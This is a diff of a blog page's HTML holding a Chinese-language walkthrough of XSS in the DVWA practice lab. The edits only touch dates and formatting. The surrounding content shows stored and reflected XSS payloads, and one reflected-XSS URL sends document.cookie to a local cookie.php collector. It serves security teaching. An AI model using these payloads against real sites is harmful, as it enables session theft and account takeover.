@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="QuanYex&#39;s Blog">
 <meta property="og:description" content="xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;img src&#x3D;2  onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;  message参数也是相同以上两种都适">
 <meta property="article:published_time" content="2020-03-14T07:14:39.000Z">
-<meta property="article:modified_time" content="2020-03-18T14:08:16.468Z">
+<meta property="article:modified_time" content="2020-03-19T01:19:11.010Z">
 <meta property="article:author" content="QuanYex">
 <meta property="article:tag" content="DVWA">
 <meta name="twitter:card" content="summary">
@@ -297,8 +297,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-03-18T22:08:16+08:00">
-                2020-03-18
+              <time title="更新于" itemprop="dateModified" datetime="2020-03-19T09:19:11+08:00">
+                2020-03-19
               </time>
             
           </span>
@@ -369,8 +369,6 @@
 <p>这里name参数只针对<code>&lt;script&gt;</code>标签进行了限制，并未限制其他例如<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等标签因此在name中：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=s onerror=alert(<span class="regexp">/xss/</span>)&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;iframe src=<span class="number">1</span> onmouseover=alert(<span class="regexp">/xss/</span>) y=<span class="number">2016</span> /&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-
-
 <h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><h3 id="low-注意"><a href="#low-注意" class="headerlink" title="low(注意)"></a>low(注意)</h3><p>打开服务器源码发现并未对name进行任何限制。在name框中随便输入点击提交，发现输入的值显示在URL中，将URL中的value进行替换，便可以实现xss</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=a onerror=alert(/</span>xss/)&gt;</span><br></pre></td></tr></table></figure>
 
@@ -384,7 +382,7 @@
 <p>此时完整的URL为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;quanyex.local.com&#x2F;dvwa-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;&lt;script&gt;document.loaction&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><strong><font color=red size=20>注意：</font></strong></p>
+<p><strong><font color=red size=15>注意：</font></strong></p>
 <p>在这里URL中首先有name参数，其value值中含有一个新的URL和参数cookie，因此在这里需要给name的值进行一次URL编码，否则浏览器会截断，无法实现正常跳转。</p>
 <p>浏览器自身编码之后为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;quanyex.local.com&#x2F;dvwa-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;%3Cscript%3Edocument.loaction&#x3D;%27http:&#x2F;&#x2F;127.0.0.1&#x2F;cookie.php?cookie&#x3D;%27+document.cookie;%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>
